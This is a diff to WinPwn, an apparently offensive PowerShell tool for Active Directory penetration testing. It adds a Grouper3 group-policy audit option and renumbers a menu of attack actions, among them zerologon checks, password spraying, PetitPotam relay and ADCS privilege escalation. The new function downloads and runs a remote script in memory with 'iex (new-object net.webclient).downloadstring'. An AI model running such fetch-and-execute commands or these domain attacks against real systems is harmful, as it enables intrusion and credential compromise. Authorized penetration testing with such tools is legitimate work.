@@ -2267,24 +2267,25 @@ __        ___       ____
         Write-Host -ForegroundColor Green '9. Search for MS17-10 vulnerable Windows Servers in the domain! '
         Write-Host -ForegroundColor Green '10. Check Domain Network-Shares for cleartext passwords! '
         Write-Host -ForegroundColor Green '11. Check domain Group policies for common misconfigurations using Grouper2! '
-        Write-Host -ForegroundColor Green '12. Search for bluekeep vulnerable Windows Systems in the domain! '
-        Write-Host -ForegroundColor Green '13. Search for potential vulnerable web apps (low hanging fruits)! '
-        Write-Host -ForegroundColor Green '14. Check remote system groups via GPO Mapping! '
-        Write-Host -ForegroundColor Green '15. Search for Systems with Admin-Access to pwn them! '
-    Write-Host -ForegroundColor Green '16. Search for printers / potential vulns! '
-    Write-Host -ForegroundColor Green '17. Search for Resource-Based Constrained Delegation attack paths! '
-    Write-Host -ForegroundColor Green '18. Enumerate remote access policies through group policy! '
-        Write-Host -ForegroundColor Green '19. Check all DCs for zerologon vulnerability! '
-    Write-Host -ForegroundColor Green '20. Check users for empty passwords! '
-    Write-Host -ForegroundColor Green '21. Check username=password combinations! '
-        Write-Host -ForegroundColor Green '22. Get network interface IPs of all domain systems via IOXIDResolver! '
-        Write-Host -ForegroundColor Green '23. Get the ADCS server(s) and templates + ESC8 Check! '
-        Write-Host -ForegroundColor Green '24. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay!'
-        Write-Host -ForegroundColor Green '25. Check the ADCS Templates for Privilege Escalation vulnerabilities via Certify!'
-        Write-Host -ForegroundColor Green '26. Enumerate ADCS Template informations and permissions via Certify!'
-        Write-Host -ForegroundColor Green '27. Check LDAP/LDAPS Signing and or Channel Binding'
-        Write-Host -ForegroundColor Green '28. (Ab)use some SCCM stuff'
-        Write-Host -ForegroundColor Green '29. Go back '
+        Write-Host -ForegroundColor Green '12. Check domain Group policies for common misconfigurations using Grouper3! '
+        Write-Host -ForegroundColor Green '13. Search for bluekeep vulnerable Windows Systems in the domain! '
+        Write-Host -ForegroundColor Green '14. Search for potential vulnerable web apps (low hanging fruits)! '
+        Write-Host -ForegroundColor Green '15. Check remote system groups via GPO Mapping! '
+        Write-Host -ForegroundColor Green '16. Search for Systems with Admin-Access to pwn them! '
+    Write-Host -ForegroundColor Green '17. Search for printers / potential vulns! '
+    Write-Host -ForegroundColor Green '18. Search for Resource-Based Constrained Delegation attack paths! '
+    Write-Host -ForegroundColor Green '19. Enumerate remote access policies through group policy! '
+        Write-Host -ForegroundColor Green '20. Check all DCs for zerologon vulnerability! '
+    Write-Host -ForegroundColor Green '21. Check users for empty passwords! '
+    Write-Host -ForegroundColor Green '22. Check username=password combinations! '
+        Write-Host -ForegroundColor Green '23. Get network interface IPs of all domain systems via IOXIDResolver! '
+        Write-Host -ForegroundColor Green '24. Get the ADCS server(s) and templates + ESC8 Check! '
+        Write-Host -ForegroundColor Green '25. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay!'
+        Write-Host -ForegroundColor Green '26. Check the ADCS Templates for Privilege Escalation vulnerabilities via Certify!'
+        Write-Host -ForegroundColor Green '27. Enumerate ADCS Template informations and permissions via Certify!'
+        Write-Host -ForegroundColor Green '28. Check LDAP/LDAPS Signing and or Channel Binding'
+        Write-Host -ForegroundColor Green '29. (Ab)use some SCCM stuff'
+        Write-Host -ForegroundColor Green '30. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2302,26 +2303,27 @@ __        ___       ____
              9{MS17-10}
              10{domainshares}
              11{GPOAudit}
-             12{bluekeep}
-             13{fruit}
-             14{groupsearch}
-             15{latmov}
-       16{printercheck}
-       17{RBCD-Check}
-       18{GPORemoteAccessPolicy}
-         19{zerologon}
-      20{Domainpassspray -emptypasswords}
-      21{Domainpassspray -usernameaspassword}
-         22{Oxidresolver}
-         23{ADCSInfos}
-         24{Invoke-RBDC-over-DAVRPC}
-         25{Invoke-VulnerableADCSTemplates}
-         26{Invoke-ADCSTemplateRecon}
-         27{LDAPChecksMenu}
-         28{SCCMMenu}
+             12{Grouper3}
+             13{bluekeep}
+             14{fruit}
+             15{groupsearch}
+             16{latmov}
+       17{printercheck}
+       18{RBCD-Check}
+       19{GPORemoteAccessPolicy}
+         20{zerologon}
+      21{Domainpassspray -emptypasswords}
+      22{Domainpassspray -usernameaspassword}
+         23{Oxidresolver}
+         24{ADCSInfos}
+         25{Invoke-RBDC-over-DAVRPC}
+         26{Invoke-VulnerableADCSTemplates}
+         27{Invoke-ADCSTemplateRecon}
+         28{LDAPChecksMenu}
+         29{SCCMMenu}
        }
     }
-  While ($masterquestion -ne 29)
+  While ($masterquestion -ne 30)
 }
 
 function SCCMMenu
@@ -3278,6 +3280,30 @@ function GPOAudit
     # todo interactive + consoleoutput
     iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Grouper2.ps1')
     Invoke-Grouper2 -command "-i 4 -f $currentPath\DomainRecon\GPOAudit.html"
+}
+
+function Grouper3
+{
+  <#
+        .DESCRIPTION
+        Check Group Policies for common misconfigurations using Grouper3 from l0ss.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Domain Recon
+        [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    # todo interactive + consoleoutput
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Grouper3.ps1')
+    Invoke-Grouper3 -command "-a 2 -f $currentPath\DomainRecon\Grouper3.log"
 }
 
 
